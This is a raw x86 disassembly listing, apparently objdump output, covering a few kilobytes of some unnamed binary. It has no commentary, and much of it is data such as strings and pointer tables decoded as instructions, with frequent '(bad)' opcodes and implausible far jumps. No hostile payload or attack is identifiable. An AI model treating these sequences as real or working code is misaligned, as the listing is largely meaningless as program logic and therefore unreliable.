  4219a7:	xor    DWORD PTR [ebx],ebx
  4219a9:	jbe    0x421945
  4219ab:	das    
  4219ac:	add    eax,0x6022ffa3
  4219b1:	outs   dx,BYTE PTR ds:[esi]
  4219b2:	retf   0xe008
  4219b5:	mov    edx,0x9e026ec0
  4219ba:	adc    al,BYTE PTR [esi+0xa63b1e9]
  4219c0:	push   edi
  4219c1:	jmp    0x70d6:0x5d691889
  4219c8:	and    al,0x3b
  4219ca:	dec    ebp
  4219cb:	sar    DWORD PTR [ebx],0x2d
  4219ce:	leave  
  4219cf:	(bad)  
  4219d0:	jmpw   0xd82f
  4219d4:	jb     0x4219d6
  4219d6:	cs test al,0x1
  4219d9:	imul   edi,DWORD PTR [edx-0x15],0xb731b23f
  4219e0:	jns    0x421a12
  4219e2:	cli    
  4219e3:	mov    ebp,0x853f88a9
  4219e8:	mov    dl,0x14
  4219ea:	add    BYTE PTR [eax],al
  4219ec:	add    BYTE PTR [eax],al
  4219ee:	fld    st(2)
  4219f0:	add    eax,0xddcf1f49
  4219f5:	ror    al,cl
  4219f7:	outs   dx,DWORD PTR ds:[esi]
  4219f8:	clc    
  4219f9:	ror    BYTE PTR [edi-0x7cb6f20b],cl
  4219ff:	in     al,0x1
  421a01:	add    BYTE PTR [ebp+0x0],dl
  421a04:	add    BYTE PTR [eax],al
  421a06:	mov    BYTE PTR [ebx-0x47],al
  421a09:	jp     0x4219b9
  421a0b:	inc    edi
  421a0c:	adc    BYTE PTR [ebp+0x50f6a1cd],cl
  421a12:	xchg   edx,eax
  421a13:	call   0xf99ab561
  421a18:	cwde   
  421a19:	test   eax,0x7a0d4157
  421a1e:	jne    0x421a35
  421a20:	movd   ebx,mm0
  421a23:	or     ebx,DWORD PTR [eax+0x6ff4c531]
  421a29:	dec    edx
  421a2a:	cli    
  421a2b:	stc    
  421a2c:	out    dx,eax
  421a2d:	adc    BYTE PTR [ebx+0x74],0xa0
  421a31:	mov    bh,0x57
  421a33:	xchg   ebp,eax
  421a34:	sbb    eax,0x4853b337
  421a39:	in     al,0x7b
  421a3b:	pop    ss
  421a3c:	ds jnp 0x421a40
  421a3f:	retf   0x1140
  421a42:	fiadd  WORD PTR [ebx]
  421a44:	call   0x84eb:0xcb0241cc
  421a4b:	(bad)  
  421a4c:	(bad)  
  421a4d:	fdivr  st,st(2)
  421a4f:	call   0x4beb172
  421a54:	sbb    DWORD PTR [eax+0x74],esi
  421a57:	retf   0x4d70
  421a5a:	sbb    BYTE PTR [eax],al
  421a5c:	add    BYTE PTR [eax],al
  421a5e:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],cl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],cl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],dl
  421a6f:	nop
  421a70:	inc    edx
  421a71:	add    BYTE PTR [eax+edx*4],dl
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],bl
  421a77:	nop
  421a78:	inc    edx
  421a79:	add    BYTE PTR [eax+edx*4],bl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],al
  421a7f:	mov    al,ds:0xa0040042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],cl
  421a87:	mov    al,ds:0xa00c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],dl
  421a8f:	mov    al,ds:0xa0140042
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],bl
  421a97:	mov    al,ds:0xa01c0042
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],al
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],al
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],cl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],cl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax],dl
  421aaf:	mov    al,0x42
  421ab1:	add    BYTE PTR [eax+esi*4],dl
  421ab4:	inc    edx
  421ab5:	add    BYTE PTR [eax],bl
  421ab7:	mov    al,0x42
  421ab9:	add    BYTE PTR [eax+esi*4],bl
  421abc:	inc    edx
  421abd:	add    BYTE PTR [eax+0x66],bh
  421ac0:	ins    BYTE PTR es:[edi],dx
  421ac1:	jp     0x421b1a
  421ac3:	jbe    0x421b0c
  421ac5:	ja     0x421b0a
  421ac7:	js     0x421b11
  421ac9:	jno    0x421b2e
  421acb:	inc    edx
  421acc:	inc    bx
  421ace:	push   ebp
  421acf:	jno    0x421b47
  421ad1:	ja     0x421b3a
  421ad3:	dec    edi
  421ad4:	dec    esp
  421ad5:	dec    ebp
  421ad6:	inc    edx
  421ad7:	jno    0x421b4a
  421ad9:	jae    0x421b2e
  421adb:	push   eax
  421adc:	arpl   WORD PTR [ebx-0x7a],dx
  421adf:	push   ds
  421ae0:	inc    edx
  421ae1:	add    BYTE PTR [esi+0x2600421e],cl
  421ae7:	sbb    eax,0xbef0042
  421aec:	mov    dl,0xe
  421aee:	jns    0x421b3e
  421af0:	xor    BYTE PTR [esi-0x79],cl
  421af3:	dec    edi
  421af4:	cmp    eax,0x3e4faf4e
  421af9:	dec    esi
  421afa:	js     0x421b4a
  421afc:	cmp    ecx,DWORD PTR [esi-0x64]
  421aff:	dec    edi
  421b00:	inc    esp
  421b01:	dec    esi
  421b02:	jae    0x421b52
  421b04:	inc    ecx
  421b05:	dec    esi
  421b06:	xor    BYTE PTR [esi+0x40],cl
  421b09:	dec    esi
  421b0a:	pop    esp
  421b0b:	pop    ebp
  421b0c:	pop    edi
  421b0d:	push   edx
  421b0e:	cmp    DWORD PTR [esi+0x79],ecx
  421b11:	dec    esi
  421b12:	xor    BYTE PTR [esi-0x79],cl
  421b15:	dec    edi
  421b16:	cmp    eax,0x3e4faf4e
  421b1b:	dec    esi
  421b1c:	js     0x421b6c
  421b1e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b21:	dec    edi
  421b22:	inc    esp
  421b23:	dec    esi
  421b24:	mov    DWORD PTR [edi+0x41],ecx
  421b27:	dec    esi
  421b28:	xor    BYTE PTR [esi+0x40],cl
  421b2b:	dec    esi
  421b2c:	pop    esp
  421b2d:	ins    DWORD PTR es:[edi],dx
  421b2e:	pop    edi
  421b2f:	bound  edi,QWORD PTR [ecx]
  421b31:	dec    esi
  421b32:	jns    0x421b82
  421b34:	xor    BYTE PTR [esi-0x80],cl
  421b37:	dec    edi
  421b38:	cmp    eax,0x394e734e
  421b3d:	dec    esi
  421b3e:	mov    ds:0x304e3a4f,al
  421b43:	dec    esi
  421b44:	inc    esi
  421b45:	dec    esi
  421b46:	pop    esp
  421b47:	jge    0x421ba8
  421b49:	jb     0x421bba
  421b4b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b4f:	xchg   ebx,eax
  421b50:	jns    0x421ae2
  421b52:	aas    
  421b53:	dec    esi
  421b54:	test   BYTE PTR [edi+0x30],cl
  421b57:	dec    esi
  421b58:	test   BYTE PTR [edi+0x3c],cl
  421b5b:	dec    esi
  421b5c:	mov    ds:0x734e394f,al
  421b61:	dec    esi
  421b62:	inc    ebp
  421b63:	dec    esi
  421b64:	xor    BYTE PTR [esi+0x44],cl
  421b67:	dec    esi
  421b68:	pop    esp
  421b69:	lea    ebx,[edi-0x7e]
  421b6c:	outs   dx,DWORD PTR ds:[esi]
  421b6d:	xchg   edx,eax
  421b6e:	outs   dx,BYTE PTR ds:[esi]
  421b6f:	xchg   ebx,eax
  421b70:	jle    0x421b15
  421b72:	jns    0x421b14
  421b74:	aas    
  421b75:	dec    esi
  421b76:	test   BYTE PTR [edi+0x30],cl
  421b79:	dec    esi
  421b7a:	test   BYTE PTR [edi+0x3c],cl
  421b7d:	dec    esi
  421b7e:	mov    ds:0x894e394f,al
  421b83:	dec    edi
  421b84:	inc    ebp
  421b85:	dec    esi
  421b86:	xor    BYTE PTR [esi+0x44],cl
  421b89:	dec    esi
  421b8a:	pop    esp
  421b8b:	popf   
  421b8c:	pop    edi
  421b8d:	xchg   edx,eax
  421b8e:	outs   dx,DWORD PTR ds:[esi]
  421b8f:	mov    ds:0xb37ea36e,al
  421b94:	jns    0x421b46
  421b96:	aas    
  421b97:	dec    esi
  421b98:	mov    cs,WORD PTR [edi+0x30]
  421b9b:	dec    esi
  421b9c:	lods   al,BYTE PTR ds:[esi]
  421b9d:	dec    edi
  421b9e:	cmp    eax,0x394e734e
  421ba3:	dec    esi
  421ba4:	mov    eax,ds:0x304e3a4f
  421ba9:	dec    esi
  421baa:	inc    esp
  421bab:	dec    esi
  421bac:	pop    esp
  421bad:	lods   eax,DWORD PTR ds:[esi]
  421bae:	pop    edi
  421baf:	mov    ds:0xb36eb26f,al
  421bb4:	jle    0x421b79
  421bb6:	jns    0x421b78
  421bb8:	aas    
  421bb9:	dec    esi
  421bba:	mov    cs,WORD PTR [edi+0x30]
  421bbd:	dec    esi
  421bbe:	lods   al,BYTE PTR ds:[esi]
  421bbf:	dec    edi
  421bc0:	cmp    eax,0x394e7e4e
  421bc5:	dec    esi
  421bc6:	lahf   
  421bc7:	dec    edi
  421bc8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bcb:	dec    esi
  421bcc:	inc    ebp
  421bcd:	dec    esi
  421bce:	pop    esp
  421bcf:	mov    ebp,0xc26fb25f
  421bd4:	outs   dx,BYTE PTR ds:[esi]
  421bd5:	ret    
  421bd6:	jle    0x421bab
  421bd8:	jns    0x421baa
  421bda:	aas    
  421bdb:	dec    esi
  421bdc:	mov    cs,WORD PTR [edi+0x30]
  421bdf:	dec    esi
  421be0:	lods   al,BYTE PTR ds:[esi]
  421be1:	dec    edi
  421be2:	cmp    eax,0x394f804e
  421be7:	dec    esi
  421be8:	lods   al,BYTE PTR ds:[esi]
  421be9:	dec    edi
  421bea:	cmp    cl,BYTE PTR [esi+0x30]
  421bed:	dec    esi
  421bee:	inc    esi
  421bef:	dec    esi
  421bf0:	pop    esp
  421bf1:	int    0x5f
  421bf3:	ret    0xd26f
  421bf6:	outs   dx,BYTE PTR ds:[esi]
  421bf7:	sar    DWORD PTR [esi-0x1d],cl
  421bfa:	jns    0x421bdc
  421bfc:	aas    
  421bfd:	dec    esi
  421bfe:	mov    cs,WORD PTR [edi+0x30]
  421c01:	dec    esi
  421c02:	lods   al,BYTE PTR ds:[esi]
  421c03:	dec    edi
  421c04:	cmp    eax,0x394f834e
  421c09:	dec    esi
  421c0a:	mov    ds:0x304e3a4f,al
  421c0f:	dec    esi
  421c10:	inc    esp
  421c11:	dec    esi
  421c12:	pop    esp
  421c13:	fstp   QWORD PTR [edi-0x2e]
  421c16:	outs   dx,DWORD PTR ds:[esi]
  421c17:	loop   0x421c87
  421c19:	jecxz  0x421c99
  421c1b:	repz jns 0x421c0e
  421c1e:	aas    
  421c1f:	dec    esi
  421c20:	lea    ecx,[edi+0x30]
  421c23:	dec    esi
  421c24:	lahf   
  421c25:	dec    edi
  421c26:	cmp    eax,0x3c4fa04e
  421c2b:	dec    esi
  421c2c:	xor    BYTE PTR [esi+0x3f],cl
  421c2f:	dec    esi
  421c30:	pop    esp
  421c31:	in     eax,dx
  421c32:	pop    edi
  421c33:	loop   0x421ca4
  421c35:	repnz outs dx,BYTE PTR ds:[esi]
  421c37:	repz jle 0x421c3d
  421c3a:	jns    0x421c3c
  421c3c:	jle    0x421c51
  421c3e:	jns    0x421c50
  421c40:	cmp    al,0x4e
  421c42:	jg     0x421c92
  421c44:	xor    BYTE PTR [esi-0x65],cl
  421c47:	dec    edi
  421c48:	xor    cl,BYTE PTR [esi-0x80]
  421c4b:	dec    edi
  421c4c:	cmp    al,0x4e
  421c4e:	lods   eax,DWORD PTR ds:[esi]
  421c4f:	dec    edi
  421c50:	cmp    ecx,DWORD PTR [esi+0x30]
  421c53:	dec    esi
  421c54:	inc    ebp
  421c55:	dec    esi
  421c56:	pop    esp
  421c57:	or     eax,0x126f025f
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	adc    edi,DWORD PTR [esi+0x23]
  421c60:	jns    0x421c82
  421c62:	aas    
  421c63:	dec    esi
  421c64:	add    BYTE PTR [eax],al
  421c66:	out    dx,al
  421c67:	sbb    al,BYTE PTR [edx+0x0]
  421c6a:	loop   0x421c88
  421c6c:	inc    edx
  421c6d:	add    dl,ch
  421c6f:	sbb    al,0x42
  421c71:	add    BYTE PTR [edx-0x1ffbde2],dl
  421c77:	sbb    eax,0x1e820042
  421c7c:	inc    edx
  421c7d:	add    dl,cl
  421c7f:	sbb    al,0x42
  421c81:	add    dh,cl
  421c83:	sbb    al,0x42
  421c85:	add    BYTE PTR [esi+0x1e],bh
  421c88:	inc    edx
  421c89:	add    BYTE PTR [edx],dh
  421c8b:	sbb    eax,0xa90d0042
  421c90:	pushf  
  421c91:	clc    
  421c92:	ss mov edx,0x1ce6f89c
  421c98:	inc    edx
  421c99:	add    BYTE PTR [esi-0x35ffbde3],dh
  421c9f:	sbb    eax,0x1dd60042
  421ca4:	inc    edx
  421ca5:	add    dh,ah
  421ca7:	sbb    eax,0x1d1e0042
  421cac:	inc    edx
  421cad:	add    dl,ch
  421caf:	sbb    al,BYTE PTR [edx+0x0]
  421cb2:	ds sbb eax,0x1d2e0042
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esi-0x49ffbde2],dl
  421cbf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cc6:	repnz sbb al,0x42
  421cc9:	add    BYTE PTR [esp+ebx*1],dl
  421ccc:	push   ss
  421ccd:	or     DWORD PTR [eax],0x7050d
  421cd3:	add    BYTE PTR [eax+0x0],al
  421cd6:	cmp    al,BYTE PTR [edx+0x3e]
  421cd9:	ds enter 0x4279,0x0
  421cde:	ins    DWORD PTR es:[edi],dx
  421cdf:	push   ebp
  421ce0:	inc    esp
  421ce1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421ce7:	in     eax,dx
  421ce8:	inc    BYTE PTR [edi]
  421cea:	aas    
  421ceb:	cli    
  421cec:	mov    ds:0x421cda05,eax
  421cf1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cf7:	xchg   esi,eax
  421cf8:	pushf  
  421cf9:	clc    
  421cfa:	mov    ah,0x95
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    ebx,0xbaf89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ecx,0xb8f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	mov    edi,0xbef89c95
  421d13:	xchg   ebp,eax
  421d14:	pushf  
  421d15:	clc    
  421d16:	mov    ebp,0xa6f89c95
  421d1b:	xchg   ebp,eax
  421d1c:	pushf  
  421d1d:	clc    
  421d1e:	jmp    0x421a:0xe26003f9
  421d25:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d29:	add    BYTE PTR [ebx+0x77],dl
  421d2c:	jbe    0x421d7e
  421d2e:	mov    dh,0x85
  421d30:	pushf  
  421d31:	clc    
  421d32:	sbb    ecx,ebp
  421d34:	push   eax
  421d35:	pop    es
  421d36:	sbb    BYTE PTR [ebx],cl
  421d38:	add    BYTE PTR [eax],al
  421d3a:	ficomp WORD PTR [edx]
  421d3c:	inc    edx
  421d3d:	add    BYTE PTR [ebx],bl
  421d3f:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d72:	ins    BYTE PTR es:[edi],dx
  421d73:	inc    eax
  421d74:	inc    edx
  421d75:	add    BYTE PTR [esi+0x66f89c85],dh
  421d7b:	add    BYTE PTR [edx+0x0],ch
  421d7e:	add    BYTE PTR [si+0x0],ah
  421d82:	push   0x64006700
  421d87:	add    BYTE PTR [esi+0x0],ah
  421d8a:	push   0x0
  421d8c:	push   0x66006400
  421d91:	add    BYTE PTR [edi+0x0],ah
  421d94:	push   0x0
  421d96:	push   0x66006700
  421d9b:	add    BYTE PTR [eax+0x0],ch
  421d9e:	add    BYTE PTR [bp+0x0],ah
  421da2:	push   0x66006700
	...
  421daf:	add    BYTE PTR [eax],al
  421db1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421db7:	dec    edi
  421db8:	lahf   
  421db9:	dec    edi
  421dba:	mov    ds:0x9f4fa64f,al
  421dbf:	dec    edi
  421dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc1:	dec    edi
  421dc2:	ins    DWORD PTR es:[edi],dx
  421dc3:	dec    esi
  421dc4:	bound  ecx,QWORD PTR [esi+0x30]
  421dc7:	dec    esi
  421dc8:	add    BYTE PTR [eax],al
  421dca:	cdq    
  421dcb:	dec    edi
  421dcc:	pushf  
  421dcd:	dec    edi
  421dce:	fwait
  421dcf:	dec    edi
  421dd0:	ins    DWORD PTR es:[edi],dx
  421dd1:	dec    esi
  421dd2:	bound  ecx,QWORD PTR [esi+0x30]
  421dd5:	dec    esi
  421dd6:	scas   eax,DWORD PTR es:[edi]
  421dd7:	dec    edi
  421dd8:	lods   eax,DWORD PTR ds:[esi]
  421dd9:	dec    edi
  421dda:	lahf   
  421ddb:	dec    edi
  421ddc:	mov    ds:0x624e6d4f,al
  421de1:	dec    esi
  421de2:	xor    BYTE PTR [esi+0x0],cl
  421de5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421deb:	dec    edi
  421dec:	test   eax,0xa04f934f
  421df1:	dec    edi
  421df2:	fwait
  421df3:	dec    edi
  421df4:	xor    BYTE PTR [esi+0x0],cl
  421df7:	add    BYTE PTR [eax],al
  421df9:	add    BYTE PTR [eax],al
  421dfb:	add    BYTE PTR [eax],al
  421dfd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421e04:	mov    WORD PTR [ebp-0x32734274],gs
  421e0a:	mov    ebp,ds
  421e0c:	mov    ebp,gs
  421e0e:	mov    ebp,?
  421e10:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e16:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e1c:	mov    WORD PTR [edx-0x74],?
  421e1f:	jae    0x421dad
  421e21:	jo     0x421daf
  421e23:	jno    0x421db1
  421e25:	jbe    0x421db3
  421e27:	ja     0x421db5
  421e29:	je     0x421db7
  421e2b:	jne    0x421db9
  421e2d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e34:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e3a:	lods   al,BYTE PTR ds:[esi]
  421e3b:	jge    0x421df9
  421e3d:	jge    0x421ddd
  421e3f:	(bad)  
  421e40:	jns    0x421eb5
  421e42:	mov    ecx,0x7d738cb1
  421e47:	ins    DWORD PTR es:[edi],dx
  421e48:	enter  0x9fc6,0x26
  421e4c:	jb     0x421e51
  421e4e:	test   eax,0xb956bb17
  421e53:	hlt    
  421e54:	test   al,0x37
  421e56:	test   al,0x7e
  421e58:	fnstenv [ecx-0x6a]
  421e5b:	mov    cl,0x6a
  421e5d:	push   0xffffffce
  421e5f:	or     BYTE PTR [edx],bl
  421e61:	xlat   BYTE PTR ds:[ebx]
  421e62:	out    dx,eax
  421e63:	add    eax,0x9321d7aa
  421e68:	scas   al,BYTE PTR es:[edi]
  421e69:	adc    DWORD PTR [esi],esp
  421e6b:	jge    0x421e90
  421e6d:	fidiv  WORD PTR [edi]
  421e6f:	leave  
  421e70:	hlt    
  421e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e72:	cmp    ax,0x1fc8
  421e76:	mov    dh,cl
  421e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e79:	(bad)  
  421e7a:	and    DWORD PTR [eax],ebx
  421e7c:	and    DWORD PTR [ecx-0x18],esi
  421e7f:	(bad)  [ebx+0x7]
  421e82:	cmc    
  421e83:	enter  0x301a,0x14
  421e87:	inc    eax
  421e88:	inc    edx
  421e89:	add    BYTE PTR [ecx+0x66],dh
  421e8c:	jp     0x421efc
  421e8e:	rcr    BYTE PTR [edx+eax*2],cl
  421e91:	add    BYTE PTR [esi],dh
  421e93:	sbb    eax,0xed080042
  421e98:	adc    al,BYTE PTR [edi]
  421e9a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421ea1:	ins    BYTE PTR es:[edi],dx
  421ea2:	push   0x49657557
  421ea7:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421ead:	push   edi
  421eae:	jp     0x421f2a
  421eb0:	dec    ebp
  421eb1:	push   esi
  421eb2:	arpl   WORD PTR gs:[ecx+0x45],si
  421eb6:	dec    edx
  421eb7:	dec    esi
  421eb8:	data16 ja 0x421f09
  421ebb:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ed6:	inc    ebp
  421ed7:	push   edx
  421ed8:	jb     0x421f4e
  421eda:	inc    esi
  421edb:	je     0x421f1e
  421edd:	inc    esi
  421ede:	jae    0x421f56
  421ee0:	dec    ebx
  421ee1:	gs dec ecx
  421ee3:	dec    ebp
  421ee4:	dec    ebp
  421ee5:	pop    edx
  421ee6:	jp     0x421f42
  421ee8:	jbe    0x421f30
  421eea:	pop    ecx
  421eeb:	jo     0x421f65
  421eed:	inc    edi
  421eee:	gs ins BYTE PTR es:[edi],dx
  421ef0:	dec    esp
  421ef1:	js     0x421f5b
  421ef3:	inc    edx
  421ef4:	js     0x421f3c
  421ef6:	dec    eax
  421ef7:	inc    ebp
  421ef8:	inc    esp
  421ef9:	inc    esp
  421efa:	push   ecx
  421efb:	dec    edx
  421efc:	ins    BYTE PTR es:[edi],dx
  421efd:	dec    ebx
  421efe:	jbe    0x421f6e
  421f00:	pop    eax
  421f01:	jbe    0x421f4e
  421f03:	inc    ecx
  421f04:	fs gs jno 0x421f75
  421f08:	push   ebx
  421f09:	inc    ecx
  421f0a:	add    BYTE PTR [eax],al
  421f0c:	inc    ebx
  421f0d:	outs   dx,BYTE PTR ds:[esi]
  421f0e:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f12:	push   edx
  421f13:	push   ecx
  421f14:	push   0x74000064
  421f19:	jne    0x421f90
  421f1b:	ins    DWORD PTR es:[edi],dx
  421f1c:	push   ecx
  421f1d:	push   eax
  421f1e:	jo     0x421f9a
  421f20:	addr16 jo 0x421f79
  421f23:	pop    eax
  421f24:	add    BYTE PTR [eax],al
  421f26:	push   ecx
  421f27:	pop    ecx
  421f28:	inc    ebx
  421f29:	inc    edx
  421f2a:	outs   dx,BYTE PTR ds:[esi]
  421f2b:	popa   
  421f2c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f30:	jne    0x421fa0
  421f32:	dec    ebx
  421f33:	je     0x421f98
  421f35:	bound  esp,QWORD PTR [edi+0x0]
  421f38:	jns    0x421f7f
  421f3a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f3d:	dec    ecx
  421f3e:	ja     0x421f85
  421f40:	dec    eax
  421f41:	inc    ebp
  421f42:	inc    edx
  421f43:	push   ebx
  421f44:	add    BYTE PTR [eax],al
  421f46:	outs   dx,DWORD PTR ds:[esi]
  421f47:	inc    edi
  421f48:	dec    esi
  421f49:	outs   dx,DWORD PTR ds:[esi]
  421f4a:	pop    ecx
  421f4b:	inc    edi
  421f4c:	jb     0x421f95
  421f4e:	jns    0x421fc6
  421f50:	inc    ecx
  421f51:	pop    eax
  421f52:	dec    esp
  421f53:	add    BYTE PTR [eax+0x48],bh
  421f56:	bound  edx,QWORD PTR [ebx+0x43]
  421f59:	pop    eax
  421f5a:	outs   dx,DWORD PTR ds:[esi]
  421f5b:	push   0x4355
  421f60:	dec    esp
  421f61:	ins    BYTE PTR es:[edi],dx
  421f62:	inc    edx
  421f63:	push   0x76666a73
  421f68:	inc    edx
  421f69:	jo     0x421f6b
  421f6b:	add    BYTE PTR [eax],al
  421f6d:	add    BYTE PTR [edi+0x6d],ah
  421f70:	je     0x421fb9
  421f72:	ins    BYTE PTR es:[edi],dx
  421f73:	jae    0x421fdf
  421f75:	inc    esi
  421f76:	ins    DWORD PTR es:[edi],dx
  421f77:	je     0x421fcf
  421f79:	push   0x56584178
  421f7e:	push   ebx
  421f7f:	addr16 dec edx
  421f81:	jo     0x421ff5
  421f83:	js     0x421ff4
  421f85:	pop    eax
  421f86:	dec    ebx
  421f87:	push   esp
  421f88:	dec    esp
  421f89:	jns    0x421fd6
  421f8b:	js     0x422005
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	pop    ecx
  421f8f:	jae    0x421fff
  421f91:	push   0x43644448
  421f96:	arpl   WORD PTR [edx+0x55],sp
  421f99:	push   0x42504e67
  421f9e:	push   ebp
  421f9f:	je     0x422016
  421fa1:	addr16 dec edi
  421fa3:	dec    esp
  421fa4:	inc    edx
  421fa5:	ins    DWORD PTR es:[edi],dx
  421fa6:	inc    esi
  421fa7:	inc    esi
  421fa8:	inc    esi
  421fa9:	arpl   WORD PTR [edx+0x47],bx
  421fac:	push   ebp
  421fad:	inc    ebx
  421fae:	popa   
  421faf:	push   edx
  421fb0:	dec    esp
  421fb1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fb8:	push   ecx
  421fb9:	push   ebx
  421fba:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fc1:	dec    edx
  421fc2:	jns    0x42202d
  421fc4:	push   edx
  421fc5:	inc    ebx
  421fc6:	jo     0x42203d
  421fc8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fcc:	fs push ebx
  421fce:	inc    ebx
  421fcf:	push   ebp
  421fd0:	push   eax
  421fd1:	ja     0x42200e
  421fd3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fd7:	mov    ebp,0xa53ddffb
  421fdc:	js     0x421f97
  421fde:	fsub   QWORD PTR [edx-0x28c4831f]
  421fe4:	add    DWORD PTR [eax],eax
  421fe6:	add    BYTE PTR fs:[eax],al
  421fe9:	add    bl,bl
  421feb:	jecxz  0x421f85
  421fed:	pop    ecx
  421fee:	xchg   esi,eax
  421fef:	push   ecx
  421ff0:	sub    esi,DWORD PTR [ebx]
  421ff2:	in     al,0x37
  421ff4:	sbb    eax,0x94cb00aa
  421ff9:	in     al,0x7
  421ffb:	enter  0xf705,0x16
  421fff:	sub    ecx,DWORD PTR [ebx]
  422001:	dec    esi
  422002:	retf   0x78e7
  422005:	or     al,0x8c
  422007:	(bad)  
  422008:	in     al,0x61
  42200a:	cwde   
  42200b:	(bad)  
  42200c:	or     BYTE PTR [eax-0x30],ah
  42200f:	xor    dl,bl
  422011:	(bad)  
  422012:	pop    ecx
  422013:	stos   BYTE PTR es:[edi],al
  422014:	or     esi,DWORD PTR [edi]
  422016:	fnstsw WORD PTR [ebp+edi*8-0x12e41aa3]
  42201d:	xchg   ah,dl
  42201f:	xchg   edx,eax
  422020:	sbb    al,BYTE PTR [eax-0x43]
  422023:	xor    DWORD PTR [edx],ebp
  422025:	leave  
  422026:	mov    ch,0x8d
  422028:	retf   
  422029:	aad    0x26
  42202b:	ja     0x422053
  42202d:	jae    0x422091
  42202f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422030:	xchg   edi,eax
  422031:	outs   dx,BYTE PTR ds:[esi]
  422032:	nop
  422033:	cld    
  422034:	mov    al,0x9a
  422036:	mov    esp,0xe92169f4
  42203b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42203c:	inc    ebx
  42203d:	and    eax,0x5ed3da9d
  422042:	dec    ebp
  422043:	pop    edx
  422044:	je     0x42205b
  422046:	add    al,0xa0
  422048:	gs xchg edx,eax
  42204a:	jnp    0x4220ae
  42204c:	xchg   esi,eax
  42204d:	cld    
  42204e:	add    BYTE PTR [eax],al
  422050:	add    BYTE PTR [eax],al
  422052:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422058:	(bad)  
  422059:	cli    
  42205a:	jl     0x4220c0
  42205c:	xlat   BYTE PTR ds:[ebx]
  42205d:	push   esi
  42205e:	bound  ebx,QWORD PTR [edi+0x4c]
  422061:	in     eax,0x9f
  422063:	xlat   BYTE PTR ds:[ebx]
  422064:	add    DWORD PTR [eax],eax
  422066:	add    BYTE PTR fs:[eax],al
  422069:	add    BYTE PTR [edx-0x5c],ah
  42206c:	xor    DWORD PTR [edx-0x25359130],ebx
  422072:	mov    edx,ss
  422074:	xchg   edi,esp
  422076:	adc    al,0x72
  422078:	add    ah,BYTE PTR [esi+ebx*4+0x12]
  42207c:	aaa    
  42207d:	adc    ecx,edx
  42207f:	pusha  
  422080:	mov    dh,0x94
  422082:	aas    
  422083:	out    0x3f,eax
  422085:	lds    edi,FWORD PTR [edx]
  422087:	pop    eax
  422088:	jg     0x422071
  42208a:	xor    DWORD PTR ds:0xda3c965a,edx
  422090:	xor    al,0x66
  422092:	div    cl
  422094:	out    dx,al
  422095:	lods   eax,DWORD PTR ds:[esi]
  422096:	aaa    
  422097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422098:	fadd   DWORD PTR ds:0xe2386c07
  42209e:	xchg   ebp,eax
  42209f:	mov    DWORD PTR [ecx-0x28],esi
  4220a2:	pop    ebp
  4220a3:	aam    0x8
  4220a5:	repz pop ss
  4220a7:	jmp    eax
  4220a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220aa:	jnp    0x4220bc
  4220ac:	xor    eax,0x68dd539c
  4220b1:	xor    ebp,esi
  4220b3:	push   ss
  4220b4:	xor    eax,0x485cc044
  4220b9:	imul   esi,DWORD PTR [edi],0x7
  4220bc:	mov    esp,0x1438c8a7
  4220c1:	das    
  4220c2:	repz push es
  4220c4:	loope  0x422055
  4220c6:	mov    dl,0x16
  4220c8:	add    eax,0x20c98b77
  4220cd:	mov    DWORD PTR [eax],0xb3000000
  4220d3:	push   ebp
